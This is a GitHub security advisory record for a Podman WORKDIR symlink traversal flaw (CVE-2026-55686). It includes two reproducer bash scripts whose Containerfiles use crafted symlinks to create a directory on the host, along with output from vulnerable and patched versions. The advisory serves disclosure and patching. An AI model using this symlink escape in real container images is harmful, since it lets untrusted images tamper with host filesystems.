{"credits": [{"type": "finder", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/106877?v=4", "events_url": "https://api.github.com/users/eriksjolund/events{/privacy}", "followers_url": "https://api.github.com/users/eriksjolund/followers", "following_url": "https://api.github.com/users/eriksjolund/following{/other_user}", "gists_url": "https://api.github.com/users/eriksjolund/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/eriksjolund", "id": 106877, "login": "eriksjolund", "node_id": "MDQ6VXNlcjEwNjg3Nw==", "organizations_url": "https://api.github.com/users/eriksjolund/orgs", "received_events_url": "https://api.github.com/users/eriksjolund/received_events", "repos_url": "https://api.github.com/users/eriksjolund/repos", "site_admin": false, "starred_url": "https://api.github.com/users/eriksjolund/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/eriksjolund/subscriptions", "type": "User", "url": "https://api.github.com/users/eriksjolund", "user_view_type": "public"}}], "cve_id": "CVE-2026-55686", "cvss": {"score": 5.3, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"}, "cvss_severities": {"cvss_v3": {"score": 5.3, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-59", "name": "Improper Link Resolution Before File Access ('Link Following')"}], "description": "### Summary

Running a malicous container image where the WORKDIR path contains a symlink can create a directory or modify ownership on the host filesystem. Modified ownership is less likely to happen as that requires help from an untrusted/malicious process that mutates the host filesystem tree during dereferencing of the WORKDIR path, to trigger a race condition.

### Patch

https://github.com/podman-container-tools/podman/commit/d18e44e9abb3bf5b7294aa70806e1368fdddfdd0

### Details

This issue was fixed in podman 5.7.1 (git commit 7ce2e00ab140c11a68301f0b161f51984131a858)

### PoC

The reproducer script _test1.bash_ demonstrates the vulnerability. 
The directory  `/var/BREAKOUT` is created on the host.
The container process uses the container directory `/var/BREAKOUT` as current working directory.

The reproducer script _test2.bash_ demonstrates the same vulnerability. 
The directory  `/var/BREAKOUT` is created on the host.
The container process uses the container directory `/usr/local` as current working directory.

The reproducer script _test2.bash_ shows that the working directory can be different from the breakout directory.

Reproducer **test1.bash**

```
#!/bin/bash
set -o errexit
set -o nounset

if [ -e /var/BREAKOUT ]; then
  echo error: path /var/BREAKOUT should not exist beforehand
  exit 1
fi

dir=$(mktemp -d)
cat > $dir/Containerfile << 'EOF'
FROM docker.io/library/alpine
RUN cd / && ln -s ../../../../../../../var symlink
USER 1234:1234
WORKDIR /symlink/BREAKOUT
CMD ["/bin/sh","-c","echo current working directory: $(pwd)"]
EOF

podman build -q --no-cache -t img $dir
podman run --rm localhost/img
ls -ld /var/BREAKOUT
```


Reproducer **test2.bash**

```
#!/bin/bash
set -o errexit
set -o nounset

if [ -e /var/BREAKOUT ]; then
  echo error: path /var/BREAKOUT should not exist beforehand
  exit 1
fi

dir=$(mktemp -d)
cat > $dir/Containerfile << 'EOF'
FROM docker.io/library/alpine
ARG breakout_dirname=/var
ARG breakout_basename=BREAKOUT
ARG produce_pwd=/usr/local
RUN mkdir -p /0/1/2/3 && \
    cd /0 && \
    ln -s 1/2/3 symlink1 && \
    mkdir -p /0/1/symlink2/${breakout_dirname} && \
    cd /0/1/symlink2/${breakout_dirname} && \
    ln -s ${produce_pwd} ${breakout_basename}
RUN cd / && ln -s ../../../../../../.. symlink2
USER 1234:1234
WORKDIR /0/symlink1/../../symlink2/${breakout_dirname}/${breakout_basename}
CMD ["/bin/sh","-c","echo current working directory: $(pwd)"]
EOF

podman build -q --no-cache -t img $dir
podman run --rm localhost/img
ls -ld /var/BREAKOUT
```



Vulnerable:

podman 5.7.0 using Fedora CoreOS 43.20251120.3.0

```
root@localhost:~# bash test1.bash 
38c27b69c61941741f49c3f87b589b422391d5908659665cabf248934be0ed80
current working directory: /var/BREAKOUT
drwxr-xr-x. 2 1234 1234 6 May 29 19:28 /var/BREAKOUT
root@localhost:~# rmdir /var/BREAKOUT/
root@localhost:~# bash test2.bash 
c3390edbe393a3f3b182e60c5900cf93444b5120fbe34dc305478b3b77a106c9
current working directory: /usr/local
drwxr-xr-x. 2 1234 1234 6 May 29 19:28 /var/BREAKOUT
```

Not vulnerable:

podman 5.7.1 using Fedora CoreOS 43.20260119.1.1

```
root@localhost:~# bash test1.bash 
0229bf752a821d5b9bb8afcf4b94e8de2a4838798ae8065414b7f939b81d0788
current working directory: /var/BREAKOUT
ls: cannot access '/var/BREAKOUT': No such file or directory
root@localhost:~# bash test2.bash 
568584150a93a003feb8ae1985173bf50ced9cba4d52f9734cb70dc75eeb7c60
current working directory: /usr/local
ls: cannot access '/var/BREAKOUT': No such file or directory
```

### Credits

We like to thank Erik Sjölund (@eriksjolund) for reporting the security impact to us.", "epss": {"percentage": 0.00317, "percentile": 0.23511}, "ghsa_id": "GHSA-q6r4-3wmg-fwcq", "github_reviewed_at": "2026-06-18T14:28:26Z", "html_url": "https://github.com/advisories/GHSA-q6r4-3wmg-fwcq", "identifiers": [{"type": "GHSA", "value": "GHSA-q6r4-3wmg-fwcq"}, {"type": "CVE", "value": "CVE-2026-55686"}], "nvd_published_at": null, "published_at": "2026-06-18T14:28:26Z", "references": ["https://github.com/podman-container-tools/podman/security/advisories/GHSA-q6r4-3wmg-fwcq", "https://github.com/podman-container-tools/podman/commit/7ce2e00ab140c11a68301f0b161f51984131a858", "https://github.com/podman-container-tools/podman/commit/d18e44e9abb3bf5b7294aa70806e1368fdddfdd0", "https://github.com/advisories/GHSA-q6r4-3wmg-fwcq"], "repository_advisory_url": "https://api.github.com/repos/podman-container-tools/podman/security-advisories/GHSA-q6r4-3wmg-fwcq", "severity": "medium", "source_code_location": "https://github.com/podman-container-tools/podman", "summary": "Podman: WORKDIR symlink traversal vulnerability", "type": "reviewed", "updated_at": "2026-06-18T14:28:27Z", "url": "https://api.github.com/advisories/GHSA-q6r4-3wmg-fwcq", "vulnerabilities": [{"first_patched_version": "5.7.1", "package": {"ecosystem": "go", "name": "github.com/containers/podman/v5"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 5.7.0"}, {"first_patched_version": null, "package": {"ecosystem": "go", "name": "github.com/containers/podman/v4"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 4.9.5"}, {"first_patched_version": null, "package": {"ecosystem": "go", "name": "github.com/containers/podman/v3"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 3.4.7"}], "withdrawn_at": null}

reasons: 資産不一致または判定情報不足

title: Podman: WORKDIR symlink traversal vulnerability
